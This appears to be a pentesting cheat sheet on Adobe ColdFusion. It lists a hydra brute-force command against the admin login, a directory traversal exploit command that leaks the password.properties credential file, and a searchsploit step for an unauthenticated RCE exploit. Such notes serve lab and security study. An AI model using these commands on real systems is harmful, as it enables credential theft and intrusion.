## What is ColdFusion?
- ColdFusion is a web development platform owned by Adobe.
- It uses a special language called CFML (ColdFusion Markup Language), which looks like HTML but has extra powers.
- It helps developers quickly make dynamic websites, connect to databases, and even send emails or create PDFs.
- Default Files	`/CFIDE/administrator/index.cfm` (Admin login).
- Brute Force Default Creds: `hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/CFIDE/administrator/enter.cfm:cfadminPassword=^PASS^&requestedURL=&submit=Login:F=Invalid"`
### CVE's
- CVE-2021-21087	JSP upload bypass
- CVE-2020-24450	Command Injection
- CVE-2020-24449	File Read
- CVE-2019-15909	Cross-Site Scripting (XSS)

### Directory Traversal (CVE-2010-2861)

- Vulnerable Endpoints
    - `/CFIDE/administrator/settings/mappings.cfm`
    -   `/CFIDE/administrator/enter.cfm`
- Exploit `python2 14641.py <TARGET_IP> 8500 "../../../../../../../../ColdFusion8/lib/password.properties"`Leak password.properties (contains encrypted admin passwords).

### Unauthenticated RCE (CVE-2009-2265)
- Vulnerable Path `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm`
- use exploit `searchsploit -m 50057.py`
